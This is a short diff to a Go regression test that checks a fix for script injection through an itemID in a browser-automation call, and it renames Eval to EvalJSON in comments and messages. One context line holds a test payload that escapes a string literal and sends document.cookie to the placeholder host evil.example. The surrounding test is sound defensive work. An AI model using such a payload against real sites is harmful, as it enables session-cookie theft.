@@ -23,7 +23,7 @@ const jsInjectionPayload = `'); fetch('https://evil.example/'+document.cookie); 
 // letting a hostile itemID break out of the '#score_%s' string literal and
 // execute arbitrary script inside the authenticated HN browser session.
 //
-// The fix passes itemID as a page.Eval *function argument* instead, so the
+// The fix passes itemID as an EvalJSON *function argument* (JSON-encoded) instead, so the
 // JS source string is now a constant, independent of itemID. This test
 // isolates the string-construction step (postMetricsEvalArgs) so the
 // safety property is directly verifiable without a live browser page.
@@ -38,7 +38,7 @@ func TestPostMetricsEvalArgsDoesNotInterpolateItemID(t *testing.T) {
 		t.Fatalf("JS source must be a constant template with no Sprintf verbs, got: %s", js)
 	}
 	if len(args) != 1 {
-		t.Fatalf("expected itemID to be passed as exactly one Eval argument, got %d: %v", len(args), args)
+		t.Fatalf("expected itemID to be passed as exactly one EvalJSON argument, got %d: %v", len(args), args)
 	}
 	if args[0] != jsInjectionPayload {
 		t.Fatalf("expected itemID to be passed through unmodified as a function argument, got %v", args[0])
